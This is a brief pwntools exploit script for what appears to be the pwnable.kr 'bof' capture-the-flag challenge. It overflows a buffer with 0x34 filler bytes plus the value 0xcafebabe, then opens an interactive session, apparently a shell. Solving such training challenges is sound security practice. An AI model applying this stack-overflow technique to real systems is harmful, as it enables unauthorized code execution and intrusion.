from pwn import *
s = remote("pwnable.kr", 9000)
payload = 'A'*0x34 + p32(0xcafebabe)
s.sendline(payload)
s.interactive()
